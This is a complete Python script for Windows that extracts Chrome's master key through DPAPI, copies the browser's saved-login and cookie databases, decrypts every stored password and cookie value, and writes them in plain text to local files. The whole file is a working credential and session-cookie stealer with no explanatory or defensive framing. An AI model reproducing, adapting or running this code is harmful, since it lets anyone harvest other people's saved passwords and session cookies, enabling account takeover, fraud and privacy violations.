import os
import json
import shutil
import base64
import sqlite3
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


class Chrome:
    def __init__(self):
        self._user_data = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data"
        self._master_key = self._get_master_key()

    def _get_master_key(self):
        with open(self._user_data + "\\Local State", "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key

    @staticmethod
    def _decrypt(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return str(e)

    def passwords(self):
        try:
            login_db = self._user_data + "\\Default\\Login Data"
            login_db_copy = os.getenv("TEMP") + "\\login.db"
            shutil.copy2(login_db, login_db_copy)
            conn = sqlite3.connect(login_db_copy)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")

                with open("passwords.txt", "w") as f:
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self._decrypt(encrypted_password, self._master_key)
                        f.write(f"URL: {url}\nUSR: {username}\nPDW: {decrypted_password}\n\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(login_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")

    def cookies(self):
        try:
            cookies_db = self._user_data + "\\Default\\Network\\cookies"
            cookies_db_copy = os.getenv("TEMP") + "\\cookies.db"
            shutil.copy2(cookies_db, cookies_db_copy)
            conn = sqlite3.connect(cookies_db_copy)
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")

                with open("cookies.txt", "w") as f:
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self._decrypt(r[2], self._master_key)
                        if host != "":
                            f.write(f"HOST KEY: {host}{' ' * (30 - len(host))} NAME: {user}{' ' * (30 - len(user))} VALUE: {decrypted_cookie}\n")

            except sqlite3.Error:
                pass

            cursor.close()
            conn.close()
            os.remove(cookies_db_copy)
        except Exception as e:
            print(f"[!]Error: {e}")


if __name__ == "__main__":
    chrome = Chrome()
    chrome.passwords()
    chrome.cookies()
